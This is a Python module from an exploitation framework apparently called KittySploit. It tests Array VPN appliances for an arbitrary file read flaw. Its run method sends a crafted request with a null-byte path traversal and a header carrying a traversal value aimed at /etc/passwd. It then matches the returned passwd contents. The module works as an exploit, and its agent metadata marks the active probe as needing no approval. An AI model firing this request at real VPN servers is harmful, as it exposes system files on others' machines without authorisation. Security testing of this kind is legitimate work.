#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Array VPN Arbitrary File Reading Vulnerability."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Array VPN - Arbitrary File Reading Vulnerability Detection',
        'description': 'Array VPN Arbitrary File Reading Vulnerability',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'lfi', 'vpn', 'arrayvpn', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/wy876/POC/blob/main/Array%20VPN%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md',
        ],
    }

    def run(self):
        path = '/prx/000/http/localhost/client_sec/%00../../../addfolder'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3', 'Accept-Encoding': 'gzip, deflate', 'X_AN_FILESHARE': 'uname=t; password=t; sp_uname=t; flags=c3248;fshare_template=../../../../../../../../etc/passwd'})
        if not r or r.status_code != 401:
            return False
        body = r.text or ""
        body_any = ('/prx/001/http/localh',)
        body_regexes = ('root:.*:0:0:',)
        if (any(m in body for m in body_any)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(severity='high', reason='Array VPN - Arbitrary File Reading Vulnerability detected', path=path)
            return True
        return False

